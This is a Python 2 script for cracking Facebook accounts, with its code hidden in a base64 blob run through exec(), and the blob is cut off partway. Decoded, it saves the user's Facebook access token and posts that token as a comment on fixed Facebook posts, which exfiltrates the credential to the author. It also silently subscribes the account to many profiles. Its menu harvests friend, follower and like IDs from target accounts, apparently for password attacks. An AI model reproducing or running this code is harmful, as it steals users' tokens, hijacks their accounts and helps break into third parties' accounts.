#coding=utf-8
#!/usr/bin/python2
# Made By Rana Nadeem Rajput
# facebook unik : https://www.facebook.com/ITXRANA.5214
# github : https://github.com/Rananadeem5214
import base64
exec(base64.b64decode("I2NvZGluZz11dGYtOA0KIyEvdXNyL2Jpbi9weXRob24yDQojIE1hZGUgQnkgUmFuYSBOYWRlZW0gUmFqcHV0DQojIGZhY2Vib29rIHVuaWsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vSVRYUkFOQS41MjE0DQojIGdpdGh1YiA6IGh0dHBzOi8vZ2l0aHViLmNvbS9SYW5hbmFkZWVtNTIxNA0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KaW1wb3J0IGRhdGV0aW1lDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgaGFzaGxpYg0KaW1wb3J0IHJlDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQganNvbg0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGNvb2tpZWxpYg0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgdXVpZA0KaW1wb3J0IGlwYWRkcmVzcw0KZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbA0KZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3INCmZyb20gdGltZSBpbXBvcnQgc2xlZXANCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQp0cnk6DQoJaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJcHJpbnQgJ1vDl10gTW9kdWwgcmVxdWVzdHMgYmVsdW0gdGVyaW5zdGFsbCEuLi5cbicNCglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnJlbG9hZChzeXMpDQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykNCmlwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0DQoNCk1BWF9JUFY0ID0gaXBhZGRyZXNzLklQdjRBZGRyZXNzLl9BTExfT05FUyAgIyAyICoqIDMyIC0gMQ0KTUFYX0lQVjYgPSBpcGFkZHJlc3MuSVB2NkFkZHJlc3MuX0FMTF9PTkVTICAjIDIgKiogMTI4IC0gMQ0KDQpkZWYgcmFuZG9tX2lwdjQoKToNCglyZXR1cm4gIGlwYWRkcmVzcy5JUHY0QWRkcmVzcy5fc3RyaW5nX2Zyb21faXBfaW50KHJhbmRvbS5yYW5kaW50KDAsIE1BWF9JUFY0KSkNCmRlZiByYW5kb21faXB2NigpOg0KCXJldHVybiBpcGFkZHJlc3MuSVB2NkFkZHJlc3MuX3N0cmluZ19mcm9tX2lwX2ludChyYW5kb20ucmFuZGludCgwLCBNQVhfSVBWNikpDQoNCmRlZiBsb2dvKCk6DQoJcHJpbnQoIiIiXDAzM1swOzkybQ0KXDAzM1swOzkybSBfX19fX18gICAgICAgICAgICAgICAgICANClwwMzNbMDs5MW18IF9fXyBcICAgICAgICAgICAgICAgICBbSGFja2VyIEJyYW5kXQ0KXDAzM1swOzkzbXwgfF8vIC9fXyBfIF8gX18gICBfXyBfIA0KXDAzM1swOzk0bXwgICAgLy8gX2AgfCAnXyBcIC8gX2AgfA0KXDAzM1swOzk1bXwgfFwgXCAoX3wgfCB8IHwgfCAoX3wgfA0KXDAzM1swOzkxbVxffCBcX1xfXyxffF98IHxffFxfXyxffA0KXDAzM1swOzkxbV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18NClwwMzNbMDs5NW1bUl0gQXV0aG9yIDogUmFuYSBOYWRlZW0gUmFqcHV0IA0KXDAzM1swOzk0bVtBXSBGYiAgICAgOiBmYi5jb20vSVRYUkFOQS41MjE0IA0KXDAzM1swOzk0bVtOXSBUZWFtICAgOiBTYW5hIEtoYW4sUmFiaWEgQXNpZixBaHRlc2hhbSBLaGFuDQpcMDMzWzA7OTNtW0FdIEdpdGh1YiA6IGdpdGh1Yi5tL1JhbmFuYWRlZW01MjE0DQpcMDMzWzA7OTJtX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyIiIikgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0Ka29tID0gJ1NjcmlwdCBiYW5nIEBbMTAwMDQxMTI5MDQ4OTQ4Ol3wn5iY8J+YmPCfmJhodHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG8ucGhwP2ZiaWQ9NTY3MzMzNTg3OTgwOTM4JnNldD1hLjEwNDY1NDY1MDkxNTUwMyZ0eXBlPTMmYXBwPWZibCBtYW50YXAgTmdnYSBBZGEgT2JhdPCfmJjwn5iY8J+YmCcNCmtvbTEgPSAnQWt1IElqaW4gUGFrZSBTY3JpcHQgTXUgQmFuZyAgQFsxMDAwNDExMjkwNDg5NDg6XfCfmJjwn5iY8J+YmGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9waG90by5waHA/ZmJpZD01NjczMzM1ODc5ODA5Mzgmc2V0PWEuMTA0NjU0NjUwOTE1NTAzJnR5cGU9MyZhcHA9ZmJs8J+YmPCfmJjwn5iYJw0Ka29tMiA9ICdTY3JpcHQgYmFuZyBAWzEwMDA0MTEyOTA0ODk0ODpd8J+YmPCfmJjwn5iYaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Bob3RvLnBocD9mYmlkPTU2NzMzMzU4Nzk4MDkzOCZzZXQ9YS4xMDQ2NTQ2NTA5MTU1MDMmdHlwZT0zJmFwcD1mYmwgbWFudGFwIE5nZ2EgQWRhIE9iYXTwn5iY8J+YmPCfmJgnDQprb20zID0gJ0FrdSBJamluIFBha2UgU2NyaXB0IE11IEJhbmcgIEBbMTAwMDQxMTI5MDQ4OTQ4Ol3wn5iY8J+YmPCfmJhodHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG8ucGhwP2ZiaWQ9NTY3MzMzNTg3OTgwOTM4JnNldD1hLjEwNDY1NDY1MDkxNTUwMyZ0eXBlPTMmYXBwPWZibPCfmJjwn5iY8J+YmCcNCmlkID0gW10NCmNwID0gW10NCm9rID0gW10NCmxvb3AgPSAwDQoNCmN0ID0gZGF0ZXRpbWUubm93KCkNCm4gPSBjdC5tb250aA0KYnVsYW4xID0gWyAgICAnSmFudWFyeScsICAgJ0ZlYnJ1YXJ5JywgICAgJ01hcmNoJywgICAgJ0FwcmlsJywgICAgJ01heScsICAgICdKdW5lJywgICAgJ0p1bHknLCAgICAnQXVndXN0JywgICAgJ1NlcHRlbWJlcicsICAgICdPY3RvYmVyJywgICAgJ05vdmVtYmVyJywgICAgJ0RlY2VtYmVyJ10NCiAgIA0KdHJ5Og0KICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoNCiAgICAgICAgZXhpdCgpDQogICAgblRlbXAgPSBuIC0gMQ0KZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgZXhpdCgpDQogICAgDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW4xW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCmJ1bGFuID0gew0KICAgICAgICAiMDEiOiAiSmFudWFyeSIsDQogICAgICAgICIwMiI6ICJGZWJydWFyeSIsDQogICAgICAgICIwMyI6ICJNYXJjaCIsDQogICAgICAgICIwNCI6ICJBcHJpbCIsDQogICAgICAgICIwNSI6ICJNYXkiLA0KICAgICAgICAiMDYiOiAiSnVuZSIsDQogICAgICAgICIwNyI6ICJKdWx5IiwNCiAgICAgICAgIjA4IjogIkF1Z3VzdCIsDQogICAgICAgICIwOSI6ICJTZXB0ZW1iZXIiLA0KICAgICAgICAiMTAiOiAiTm92ZW1iZXIiLA0KICAgICAgICAiMTEiOiAiT2N0b2JlciIsDQogICAgICAgICIxMiI6ICJEZWNlbWJlciINCn0NCg0KIy0tLS0tLS0+Qk9UIEpBTkdBTiBESSBVQkFIIEtPTlRPTCBLQUxPIE1BVSBOQU1CQUggTkFNQkFIIEFKQSBKQU5HQU4gREkgVUJBSCBZQSBBSkc8LS0tLS0tLSMNCmRlZiBpd2FuX2RldigpOg0KICAgIHRyeToNCiAgICAgICAgdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAoJyBbIV0gVG9rZW4gaW52YWxpZCcpIA0KICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KICAgICAgICANCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPScgKyB0b2tlbikNCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NjczMzM1ODc5ODA5MzgvY29tbWVudHMvP21lc3NhZ2U9JyArIHRva2VuICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2VuKSANCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NjczMzM1ODc5ODA5MzgvY29tbWVudHMvP21lc3NhZ2U9JyArIGtvbSArICcmYWNjZXNzX3Rva2VuPScgKyB0b2tlbikgDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNTY3MzMzNTg3OTgwOTM4L2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20xICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2VuKSANCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NjczMzM1ODc5ODA5MzgvbGlrZXM/c3VtbWFyeT10cnVlJmFjY2Vzc190b2tlbj0nICsgdG9rZW4pIA0KICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzU2MTM5OTE0NTI0MTA0OS9jb21tZW50cy8/bWVzc2FnZT0nICsgdG9rZW4gKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZW4pIA0KICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzU2MTM5OTE0NTI0MTA0OS9jb21tZW50cy8/bWVzc2FnZT0nICsga29tMiArICcmYWNjZXNzX3Rva2VuPScgKyB0b2tlbikgDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNTYxMzk5MTQ1MjQxMDQ5L2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20zICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2VuKSANCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NjEzOTkxNDUyNDEwNDkvbGlrZXM/c3VtbWFyeT10cnVlJmFjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIxNDgzNDk4MTM1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4MjYyOTYyNjU0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEzOTUxMzA4MDU3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQwMjQ4MTA1NzE2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDU1OTEwNjQ1NDAyL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM3Mzg5NjM4MjAzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA4NDY4Mjg4MDc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEzMTQ0Njg1NTA0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDE3ODM3MTQwMzg4L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQxNzcxMjQxMTkxL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDY0MDk4NDgxOTkxL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAwMDk1MjA1NTY1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAwMDk1MjA1NTY1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAwMDU2NTYxODgyL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAwMzEyMjA4MDQxL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAxMDI3NzY0MzE4L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNjM4MTI0MzI3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDE1MDczNTA2MDYyL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDY3OTUzNjIwMzc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pDQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTQ0NTEyMjUxNS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JyArIHRva2VuKQ0KICAgIG1lbnUoKQ0KDQojLS0tLS0tLT5sb2dpbiB0b2tlbiBqYW5nYW4gbHVwYSBtYXN1a2luIHRva2VuIGZhY2Vib29rIGphbmdhbiB0b2tlbiBsaXN0cmlrIGtvbnRvbDwtLS0tLS0tIyAgICANCmRlZiBnZW4oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2VuID0gb3BlbignbG9naW4udHh0JywncicpDQoJCW1lbnUoKSANCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJbG9nbygpDQoJCXRva2VuID0gcmF3X2lucHV0KCJbdG9rZW5dIDogIikNCgkJDQoJCXRyeToNCgkJCW90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScrdG9rZW4pDQoJCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJCXplZGQgPSBvcGVuKCJsb2dpbi50eHQiLCAndycpDQoJCQl6ZWRkLndyaXRlKHRva2VuKQ0KCQkJemVkZC5jbG9zZSgpDQoJCQlwcmludCAoIltSYW5hXSAgbG9naW4gc3VjY2VzZnVsICIpDQoJCQlpd2FuX2RldigpDQoJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vSVRYUkFOQS41MjE0JykNCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcHJpbnQgKCIgWyFdIFRva2VuIEludmFsaWQiKSANCgkJCXN5cy5leGl0KCkNCg0KdXNlcmFnZW50cyA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgUmVkbWkgNkEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjQwLjAuMC45LjExNTtdJywNCidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IFJlZG1pIDUgQnVpbGQvT1BNMS4xNzEwMTkuMDI2OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzczLjAuMzY4My45MCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzI0MC4wLjAuOS4xMTU7XScNCiMtLS0tLS0tPm1lbnUgY3JhY2sgcGFrPC0tLS0tLS0jDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWdsb2JhbCB0b2tlbg0KCXRyeToNCgkJdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJCW90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvP2FjY2Vzc190b2tlbj0nK3Rva2VuKQ0KCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJbmFtYSA9IGFbJ25hbWUnXQ0KCQlpZCA9IGFbJ2lkJ10NCglleGNlcHQgS2V5RXJyb3I6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCAoJ1tlcnJvciBjYW5ub3QgY3JhY2tdJykNCgkJb3Muc3lzdGVtKCJybSAtZiBsb2dpbi50eHQiKQ0KCQlnZW4oKQ0KCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJcHJpbnQgKCcgKiBubyBjb25uZWN0aW9uIHBsZWFzZSBjb25uZWN0IHlvdXIgY29ubmVjdGlvbicpDQoJCXN5cy5leGl0KCkNCglsb2dvKCkNCglwcmludCJbSGVsbG9dOiAiICtuYW1hDQoJcHJpbnQiW2lwIGFkZHJlc10gOiAiICtpcA0KCXByaW50IlwwMzNbMDs5Mm0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iDQoJcHJpbnQiXDAzM1swOzkybVsxXWNyYWNrIGZyb20gcHVibGljIGlkW211bHRpXRoiDQoJcHJpbnQiXDAzM1swOzkybVsyXWNyYWNrIGZyb20gZm9sbG93ZXIgaWQiDQoJcHJpbnQiXDAzM1swOzkybVszXWNyYWNrIGZyb20gcHVibGljIHBvc3QgbGlrZSINCglwcmludCJcMDMzWzA7OTJtWzRdY3JhY2sgZnJvbSBwdWJsaWMgaWRbU2luZ2xlXSINCglwcmludCJcMDMzWzA7OTJtWzVdY2hlY2sgY3JhY2sgcmVzdWx0GiINCglwcmludCJcMDMzWzA7OTFtWzBdcmVtb3ZlIHRva2VuGiINCglwcmludCJcMDMzWzA7OTJtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KCXBpbGloX3BhaygpDQoNCmRlZiBwaWxpaF9wYWsoKToNCglhc2sgPSByYXdfaW5wdXQoIltTZWxlY3RdOiAiKQ0KCWlmIGFzayA9PSAiIjoNCgkJcHJpbnQNCgkJcHJpbnQgKCJbY2hvb3NlIHRoZSByaWdodCBvbmUgZGVhcl0iKSANCgkJZXhpdCgpDQoJZWxpZiBhc2sgPT0gIjEiIG9yIGFzayA9PSAiMDEiOg0KCQlwcmludCAoIlxuW3R5cGUgJ21lJyB0byBjcmFjayBPd24gZnJpZW5kcyBsaXN0XSIpIA0KCQlpZHQgPSByYXdfaW5wdXQoIltpZCBwdWJsaWMxXSA6ICIpDQoJCXRyeToNCgkJCXBvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJCXNwID0ganNvbi5sb2Fkcyhwb2sudGV4dCkNCgkJCXByaW50ICgiW25hbWVdIDogIitzcFsibmFtZSJdKSANCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcHJpbnQgKCJbU29ycnkgaWQgbm90IHB1YmxpY10iKSANCgkJCWV4aXQoKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIGkgaW4gelsiZGF0YSJdOg0KCQkJdWlkID0gaVsnaWQnXQ0KCQkJbmEgPSBpWyduYW1lJ10NCgkJCW5tID0gbmEucnNwbGl0KCIgIilbMF0NCgkJCWlkLmFwcGVuZCh1aWQrJ3wnK25tKQ0KCQkJDQoJCWlkdCA9IHJhd19pbnB1dCgiW2lkIHB1YmxpYzJdIDogIikNCgkJdHJ5Og0KCQkJcG9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2VuKQ0KCQkJc3AgPSBqc29uLmxvYWRzKHBvay50ZXh0KQ0KCQkJcHJpbnQgKCJbbmFtZV0gOiAiK3NwWyJuYW1lIl0pIA0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCAoIltTb3JyeSBpZCBub3QgcHVibGljXSIpIA0KCQkJZXhpdCgpDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCQlmb3IgaSBpbiB6WyJkYXRhIl06DQoJCQl1aWQgPSBpWydpZCddDQoJCQluYSA9IGlbJ25hbWUnXQ0KCQkJbm0gPSBuYS5yc3BsaXQoIiAiKVswXQ0KCQkJaWQuYXBwZW5kKHVpZCsnfCcrbm0pDQoJCWlkdCA9IHJhd19pbnB1dCgiW2lkIHB1YmxpYzNdIDogIikNCgkJdHJ5Og0KCQkJcG9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2VuKQ0KCQkJc3AgPSBqc29uLmxvYWRzKHBvay50ZXh0KQ0KCQkJcHJpbnQgKCJbbmFtZV0gOiAiK3NwWyJuYW1lIl0pIA0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCAoIltTb3JyeSBpZCBub3QgcHVibGljXSIpIA0KCQkJZXhpdCgpDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCQlmb3IgaSBpbiB6WyJkYXRhIl06DQoJCQl1aWQgPSBpWydpZCddDQoJCQluYSA9IGlbJ25hbWUnXQ0KCQkJbm0gPSBuYS5yc3BsaXQoIiAiKVswXQ0KCQkJaWQuYXBwZW5kKHVpZCsnfCcrbm0pDQoJCQkNCgllbGlmIGFzayA9PSAiMiIgb3IgYXNrID09ICIwMiI6DQoJCXByaW50ICgiXG5bIHR5cGUgJ21lJyB0byBjcmFjayB5b3VyIG93biBmb2xsb3dlciBsaXN0XSIpIA0KCQlpZHQgPSByYXdfaW5wdXQoIltpZCBwdWJsaWNdIDogIikNCgkJdHJ5Og0KCQkJcG9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2VuKQ0KCQkJc3AgPSBqc29uLmxvYWRzKHBvay50ZXh0KQ0KCQkJcHJpbnQgKCIgKiAgbmFtZSAgICAgIDogIitzcFsibmFtZSJdKSANCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcHJpbnQgKCJbU29ycnkgaWQgbm90IHB1YmxpY10iKSANCgkJCWV4aXQoKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL3N1YnNjcmliZXJzP2xpbWl0PTk5OTk5OSZhY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCQlmb3IgaSBpbiB6WyJkYXRhIl06DQoJCQl1aWQgPSBpWydpZCddDQoJCQluYSA9IGlbJ25hbWUnXQ0KCQkJbm0gPSBuYS5yc3BsaXQoIiAiKVswXQ0KCQkJaWQuYXBwZW5kKHVpZCsnfCcrbm0pDQoJZWxpZiBhc2sgPT0gIjMiIG9yIGFzayA9PSAiMDMiOg0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2xpa2VzP2xpbWl0PTk5OTk5OTkmYWNjZXNzX3Rva2VuPSIrdG9rZW4pDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIGkgaW4gelsnZGF0YSddOg0KCQkJdWlkID0gaVsnaWQnXQ0KCQkJbmEgPSBpWyduYW1lJ10NCgkJCW5tID0gbmEucnNwbGl0KCIgIilbMF0NCgkJCWlkLmFwcGVuZCh1aWQrJ3wnK25tKQ0KCWVsaWYgYXNrID09ICI0IiBvciBhc2sgPT0gIjA0IjoNCgkJcHJpbnQgKCJcblt0eXBlICdtZScgdG8gY3JhY2sgT3duIGZyaWVuZHMgbGlzdF0iKSANCgkJaWR0ID0gcmF3X2lucHV0KCJbaWQgcHVibGljXSA6ICIpDQoJCXRyeToNCgkJCXBvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJCXNwID0ganNvbi5sb2Fkcyhwb2sudGV4dCkNCgkJCXByaW50ICgiW25hbWVdIDogIitzcFsibmFtZSJdKSANCgkJZXhjZXB0IE